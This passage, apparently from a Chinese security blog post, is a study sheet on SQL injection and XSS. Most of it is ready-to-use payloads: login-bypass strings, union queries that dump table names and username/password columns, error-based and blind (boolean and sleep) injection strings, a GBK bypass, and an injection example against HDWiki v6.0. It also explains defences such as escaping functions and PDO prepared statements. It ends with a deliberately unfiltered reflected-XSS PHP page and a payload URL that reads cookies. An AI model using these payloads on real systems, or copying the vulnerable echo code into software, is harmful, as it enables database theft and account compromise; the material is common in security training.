+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> table_name <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'our input'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> table_name <span class="keyword">WHERE</span> <span class="keyword">id</span>=our <span class="keyword">input</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> table_name <span class="keyword">WHERE</span> <span class="keyword">id</span>=(<span class="string">'out input'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> table_name <span class="keyword">WHERE</span> <span class="keyword">id</span>=(<span class="string">"our input"</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2020/02/07/12S2uT.png" alt="12S2uT.png"></p>
+<p>原理如上</p>
+<h4 id="数据库查询版本"><a href="#数据库查询版本" class="headerlink" title="数据库查询版本"></a>数据库查询版本</h4><ul>
+<li>Mssql: select @@version</li>
+<li>Mysql: select version（）/select @@version</li>
+<li>oracle: select banner from ￥version</li>
+<li>Postgresql: select version（）</li>
+</ul>
+<h4 id="判断过滤了哪些字符？"><a href="#判断过滤了哪些字符？" class="headerlink" title="判断过滤了哪些字符？"></a>判断过滤了哪些字符？</h4><p>采用异或注入。<br>在id=1后面输入 ‘(0)’<br>发现不出错，那就将0换成1=1<br>如果出错，那就是成功了</p>
+<p>如果括号里面的判断是假的，那么页面就会显示正确<br>那么同理，<br>如果修改里面的内容为length(‘union’)!=0<br>如果页面显示正确，那就证明length(‘union’)==0的，也就是union被过滤了</p>
+<h4 id="判断字段长度"><a href="#判断字段长度" class="headerlink" title="判断字段长度"></a>判断字段长度</h4><ul>
+<li><h4 id="order-by-数字-可以判断字段的个数"><a href="#order-by-数字-可以判断字段的个数" class="headerlink" title="order by 数字 可以判断字段的个数"></a>order by 数字 可以判断字段的个数</h4></li>
+<li>也可以用猜字段 union select 1，2，3</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=1' order by 1</span><br><span class="line">id=1' order by 2</span><br><span class="line">...</span><br><span class="line">id=1' order by n</span><br></pre></td></tr></table></figure>
+
+<p>如果n出现了错误那么共有n-1列，union查询必须列数量对齐，也就是说union select 1,2,…,n-1 from …</p>
+<h4 id="判断字段回显位置"><a href="#判断字段回显位置" class="headerlink" title="判断字段回显位置"></a>判断字段回显位置</h4><p>在链接后面添加语句<code>union select 1,2,3,4,5,6,7,8,9,10,11#</code>进行联合查询（联合查询时记得把前面的查询为空）来暴露可查询的字段号。</p>
+<h4 id="判断数据库注入"><a href="#判断数据库注入" class="headerlink" title="判断数据库注入"></a>判断数据库注入</h4><p>利用内置函数暴数据库信息<br>version()版本；database()数据库；user()用户；<br>不用猜解可用字段暴数据库信息(有些网站不适用):</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union all <span class="keyword">select</span> <span class="keyword">version</span>()</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="keyword">database</span>()</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="keyword">user</span>()</span><br><span class="line">操作系统信息：<span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> @@global.version_compile_os <span class="keyword">from</span> mysql.user</span><br><span class="line">数据库权限：<span class="keyword">and</span> <span class="keyword">ord</span>(<span class="keyword">mid</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">114</span> 返回正常说明为root</span><br></pre></td></tr></table></figure>
+
+<h4 id="绕过登陆验证"><a href="#绕过登陆验证" class="headerlink" title="绕过登陆验证"></a>绕过登陆验证</h4><ul>
+<li>admin’ –</li>
+<li>admin’ #</li>
+<li>admin’/*</li>
+<li>’ or 1=1–</li>
+<li>’ or 1=1#</li>
+<li>’ or 1=1/*</li>
+<li>‘) or ‘1’=’1–</li>
+<li>‘) or (‘1’=’1–</li>
+</ul>
+<h4 id="SQL注入常见函数"><a href="#SQL注入常见函数" class="headerlink" title="SQL注入常见函数"></a>SQL注入常见函数</h4><ul>
+<li>group_concat函数 可以把查询的内容组合成一个字符串</li>
+<li>load_file(file name ) 读取文件并将文件按字符串返回</li>
+<li>left（string，length）返回最左边指定的字符数：</li>
+<li>left（database（），1）&gt;‘s’ (猜名字)</li>
+<li>length（）判断长度</li>
+<li>length（database（）&gt;5</li>
+<li>substr（a，b，c）从字符串a中截取 b到c长度</li>
+<li>ascii（）将某个字符转为ascii值</li>
+<li>ascii（substr（user（），1，1））=101#</li>
+<li>mid（（a，b，c）从字符串a中截取 b到c位置（可以用来猜数据库名 ）</li>
+</ul>
+<h4 id="联合爆库："><a href="#联合爆库：" class="headerlink" title="联合爆库："></a>联合爆库：</h4><p>这里假设有3列：</p>
+<p>为了让联合注入工作，首先要知道数据库中的表名，键入：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1' union <span class="keyword">select</span> <span class="number">1</span>,table_name,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">--+ //--+是把语句闭合后注释掉后面的语句</span></span><br></pre></td></tr></table></figure>
+
+<p>有时程序可能不会打印出所有的行，这时我们就得使用关键字limit一条条进行查询，键入：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1' union <span class="keyword">select</span> <span class="number">1</span>,table_name,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span> <span class="comment">--+</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span><span class="string">' union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 2,1 --+</span></span><br></pre></td></tr></table></figure>
+
+<p>或者可以用group_concat():</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>假设有’users’表</p>
+<p>现在看其中的一个表，为了提取其信息，键入：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>注意，我们使用’column’替换了’table’，因为我们想要的是一个表的列信息<br>假设有’username’，’password’，’flag’列，我们可以键入：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(username),<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="comment">--+</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span><span class="string">' union select 1,group_concat(username),group_concat(password) from users --+</span></span><br><span class="line"><span class="string">id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,flag,<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>即可按需查询所需要的信息。</p>
+<h4 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">- floor （<span class="keyword">SELECT</span> <span class="keyword">user</span>()可修改）</span><br><span class="line"></span><br><span class="line">- <span class="keyword">OR</span> (<span class="keyword">SELECT</span> <span class="number">8627</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="number">0x70307e</span>,(<span class="keyword">SELECT</span> <span class="keyword">user</span>()),<span class="number">0x7e7030</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a)–+</span><br><span class="line">  </span><br><span class="line">- ExtractValue(有长度限制,最长<span class="number">32</span>位) （<span class="keyword">select</span> @@<span class="keyword">version</span>可修改）</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">and</span> extractvalue(<span class="number">1</span>, <span class="keyword">concat</span>(<span class="number">0x7e</span>, (<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>))–+</span><br><span class="line"></span><br><span class="line">- UpdateXml(有长度限制,最长<span class="number">32</span>位) （<span class="keyword">SELECT</span> @@<span class="keyword">version</span>可修改）</span><br><span class="line"></span><br><span class="line">  <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)–+</span><br><span class="line"></span><br><span class="line">- <span class="keyword">NAME_CONST</span>(适用于低版本，不太好用)</span><br><span class="line"></span><br><span class="line">- <span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>(),<span class="number">1</span>),<span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>(),<span class="number">1</span>)) <span class="keyword">as</span> x)–+</span><br><span class="line"></span><br><span class="line">- <span class="keyword">Error</span> based <span class="keyword">Double</span> <span class="keyword">Query</span> Injection</span><br><span class="line"></span><br><span class="line">- <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat_ws</span>(<span class="number">0x7e</span>,<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)) <span class="keyword">having</span> <span class="keyword">min</span>(<span class="number">0</span>) <span class="keyword">or</span> <span class="number">1</span>–+</span><br><span class="line"></span><br><span class="line">- <span class="keyword">exp</span>(<span class="number">5.5</span><span class="number">.5</span>以上) （<span class="keyword">select</span> <span class="keyword">user</span>()可修改）</span><br><span class="line"></span><br><span class="line">- <span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x)))–+</span><br><span class="line"></span><br><span class="line">- <span class="keyword">floor</span>(Mysql): <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">user</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x </span><br><span class="line"><span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br><span class="line"></span><br><span class="line">- Extractvalue(Mysql): and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)));</span><br><span class="line"></span><br><span class="line">- Updatexml(Mysql): and (updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">- EXP: and exp(~(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a));</span><br><span class="line"></span><br><span class="line">- UTL INADDR. get host address(Oracle): and 1=utl inaddrget host address(<span class="keyword">select</span> bannerO <span class="keyword">from</span> sys.v_$<span class="keyword">version</span> <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">- multipoint(Mysql)：<span class="keyword">and</span> multipoint((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line">- polygon(Mysql)：and polygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line">- multipolygon(Mysql)：and multipolygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> </span><br><span class="line"><span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line">- linestring(Mysql)：and linestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line">- multilinestring(Mysql)：and multilinestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h4><ul>
+<li><p>盲注的时候一定注意，MySQL4之后大小写不敏感，可使用binary()函数使大小写敏感。</p>
+</li>
+<li><h5 id="布尔条件构造"><a href="#布尔条件构造" class="headerlink" title="布尔条件构造"></a>布尔条件构造</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//正常情况</span><br><span class="line"> 'or bool<span class="comment">#</span></span><br><span class="line"> true'and bool<span class="comment">#</span></span><br><span class="line">     </span><br><span class="line"> //不使用空格、注释</span><br><span class="line"> 'or(bool)='1</span><br><span class="line"> true'and(bool)='1</span><br><span class="line">     </span><br><span class="line"> //不使用or、and、注释</span><br><span class="line"> '^!(bool)='1</span><br><span class="line"> '=(bool)='</span><br><span class="line"> '||(bool)='1</span><br><span class="line"> true'%26%26(bool)='1</span><br><span class="line"> '=if((bool),1,0)='0</span><br><span class="line">     </span><br><span class="line"> //不使用等号、空格、注释</span><br><span class="line"> 'or(bool)&lt;&gt;'0</span><br><span class="line"> 'or((bool)in(1))or'0</span><br><span class="line">     </span><br><span class="line"> //其他</span><br><span class="line"> or (case when (bool) then 1 else 0 <span class="keyword">end</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>有时候where字句有括号又猜不到SQL语句的时候，可以有下列类似的fuzz</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' or (bool) or '1'='1</span><br><span class="line">1%' and (bool) or 1=1 and '1'='1</span><br></pre></td></tr></table></figure>
+</li>
+<li><h5 id="构造逻辑判断"><a href="#构造逻辑判断" class="headerlink" title="构造逻辑判断"></a>构造逻辑判断</h5><ul>
+<li><p>逻辑判断基本就那些函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">left(user(),1)&gt;&#39;r&#39;  </span><br><span class="line">right(user(),1)&gt;&#39;r&#39;  </span><br><span class="line">substr(user(),1,1)&#x3D;&#39;r&#39;  </span><br><span class="line">mid(user(),1,1)&#x3D;&#39;r&#39; </span><br><span class="line">    </span><br><span class="line">&#x2F;&#x2F;不使用逗号 </span><br><span class="line">user() regexp &#39;^[a-z]&#39;</span><br><span class="line">user() like &#39;root%&#39;</span><br><span class="line">POSITION(&#39;root&#39; in user())</span><br><span class="line">mid(user() from 1 for 1)&#x3D;&#39;r&#39;</span><br><span class="line">mid(user() from 1)&#x3D;&#39;r&#39;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><h5 id="利用order-by盲注"><a href="#利用order-by盲注" class="headerlink" title="利用order by盲注"></a>利用order by盲注</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where username='' or 1 union select 1,2,'5' order by 3;</span><br><span class="line">+<span class="comment">----+--------------+------------------------</span></span><br><span class="line">| id |    username  | password                   </span><br><span class="line">+<span class="comment">----+--------------+------------------------</span></span><br><span class="line">|  1 | 2            | 5                         </span><br><span class="line">|  1 | admin        | 51b7a76d51e70b419f60d34 </span><br><span class="line">+<span class="comment">----+----------- --+------------------------</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line">    </span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username=<span class="string">''</span> <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'6'</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>;</span><br><span class="line">+<span class="comment">-----+-----------+--------------------------</span></span><br><span class="line">|id   | username  | password                  </span><br><span class="line">+<span class="comment">-----+-----------+--------------------------</span></span><br><span class="line">|  1  | admin     |51b7a76d51e70b419f60d3</span><br><span class="line">|  1  |    2      | 6                          </span><br><span class="line">+<span class="comment">-----+-----------+--------------------------</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h4 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h4><ul>
+<li>相对于bool盲注，就是把返回值0和1改为是否执行延时，能用其他方法就不使用延时。</li>
+<li>一般格式if((bool),sleep(3),0)和or (case when (bool) then sleep(3) else 0 end)</li>
+<li>两个函数：</li>
+<li>BENCHMARK(100000,MD5(1))</li>
+<li>sleep(5)</li>
+<li>BENCHMARK()用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源，推荐使用sleep()。</li>
+</ul>
+<h4 id="Mysql注释符"><a href="#Mysql注释符" class="headerlink" title="Mysql注释符"></a>Mysql注释符</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="comment">-- -</span></span><br><span class="line">2. <span class="comment">/* .... */</span></span><br><span class="line">3. <span class="comment">#</span></span><br><span class="line">4. `</span><br><span class="line">5. ;%00</span><br></pre></td></tr></table></figure>
+
+<h4 id="GBK绕过注入"><a href="#GBK绕过注入" class="headerlink" title="GBK绕过注入"></a>GBK绕过注入</h4><ul>
+<li>在分号前加%df%27</li>
+<li>示例：id=1%df%27 union select 1.2–+</li>
+</ul>
+<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>以HDWiki v6.0 UTF8-20170209 前台sql注入为例，index.php?doc-create创建词条可以通过<code>aaaa……aa&#39;</code> 81个字符，经过转义变成<code>aaaa……aa\&#39;</code>82个字符，经过截断变成<code>aaaa……aa\</code>81个字符，将sql语句中的单引号转义，并且后面一个参数用户可控，产生了SQL注入</p>
+<p><code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;</code></p>
+<p><code>，concat(user(),0x7c,database(),0x7c,version()),1,1,#</code></p>
+<h4 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h4><h5 id="gpc-rutime魔术引号"><a href="#gpc-rutime魔术引号" class="headerlink" title="gpc/rutime魔术引号"></a>gpc/rutime魔术引号</h5><ul>
+<li>magic_quotes_gpc负责对GET、POST、COOKIE的值进行过滤</li>
+<li>magic_quotes_runtime对从数据库或者文件中获取的数据进行过滤。上面的二次注入可以使用这个函数对特殊符号转义</li>
+</ul>
+<p>开启这两个选项也只能防御部分SQL注入。因为他们只对<code>&#39;</code>、<code>&quot;</code>、<code>\</code>、<code>空字符</code>进行转义,在int型注入上没有太大作用。</p>
+<h5 id="过滤函数和类"><a href="#过滤函数和类" class="headerlink" title="过滤函数和类"></a>过滤函数和类</h5><h6 id="addslashes函数"><a href="#addslashes函数" class="headerlink" title="addslashes函数"></a>addslashes函数</h6><p>addslashes也是对<code>&#39;</code>、<code>&quot;</code>、<code>\</code>、<code>空字符</code>进行转义，大多数程序使用它实在程序入口，判断如果没有没有开启gpc,则使用它对参数进行过滤,不过他的参数必须是string,所以如果参数是数组类型,那么必须使用此函数对数组递归过滤。</p>
+<h6 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_[real]_escape_string"></a>mysql_[real]_escape_string</h6><p>mysql_escape_string和mysql_real_escape_string函数都是对字符串进行过滤,在php4.0.3以上版本才有这两个函数,<code>\x00</code>、<code>\n</code>、<code>\r</code>、<code>\</code>、<code>&#39;</code>、<code>&quot;</code>、<code>\x1a</code>。不同在于mysql_real_escape_string接受的是一个连接句柄并根据当前字符集转义字符串,所以最好使用mysql_real_escape_string。</p>
+<p>mysql_escape_string</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$item = <span class="string">"Zak's Laptop"</span>;</span><br><span class="line">$escaped_item = mysql_escape_string($item);</span><br></pre></td></tr></table></figure>
+
+<p>mysql_real_escape_string</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">$item = <span class="string">"Zak's Laptop"</span>;</span><br><span class="line">$escaped_item = mysql_real_escape_string($item,$conn);</span><br></pre></td></tr></table></figure>
+
+<h6 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h6><p>将字符转换成数值</p>
+<p>eg:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">'1 union select'</span>;</span><br><span class="line">$id = intval($id);</span><br><span class="line"><span class="keyword">echo</span> $id;</span><br></pre></td></tr></table></figure>
+
+<h5 id="PDO预编译方式"><a href="#PDO预编译方式" class="headerlink" title="PDO预编译方式"></a>PDO预编译方式</h5><p>使用PDO方式基本可以防止sql注入,原因是因为有两次传输，前一次传一个sql模板，第二次传查询参数，会把第二步传入的参数只做查询参数处理，不做语义解释，这样注入的条件就算执行了，也不会得到查询结果。但是还是存在特殊情况会在使用了PDO方式也会存在注入,可以参考<a href="https://stackoverflow.com/questions/134099/are-pdo-prepared-statements-sufficient-to-prevent-sql-injection/12202218#12202218" target="_blank" rel="noopener">https://stackoverflow.com/questions/134099/are-pdo-prepared-statements-sufficient-to-prevent-sql-injection/12202218#12202218</a></p>
+<p>eg:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	$pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=test'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">	<span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">$sta = $pdo-&gt;prepare(<span class="string">'select * from table where name = ?'</span>); <span class="comment">//准备 SQL 模版，其中 ? 代表一个参数。</span></span><br><span class="line">$sta-&gt;execute(<span class="keyword">array</span>(<span class="string">'name1'</span>)); <span class="comment">//通过数组设置参数，执行 SQL 模版</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><h3 id="成因与危害"><a href="#成因与危害" class="headerlink" title="成因与危害"></a>成因与危害</h3><p>参数没有被过滤或严格过滤,且参数传入到了输出函数,被输出到了页面。常出现在文章发表、评论回复、留言、资料修改等地方。</p>
+<p>可能产生如下危害:</p>
+<ul>
+<li>窃取cookie</li>
+<li>修改页面进行钓鱼</li>
+<li>前端能做的事情,xss都能做到</li>
+</ul>
+<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>反射型、存储型、dom型</p>
+<h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>经过了后端,但是没有经过经过数据库。</p>
+<p>数据流向: 浏览器 -&gt; 后端 -&gt; 浏览器</p>
+<p>eg:</p>
+<p>reflectxss.php(test on mysql 5.5.38)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">XSS反射演示</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"get"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"xss"</span>/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"test"</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">$xss = @$_GET[<span class="string">'xss'</span>];</span><br><span class="line"><span class="keyword">if</span>($xss!==<span class="keyword">null</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $xss;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>http://127.0.0.1/reflectxss.php?xss=%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E</code></p>
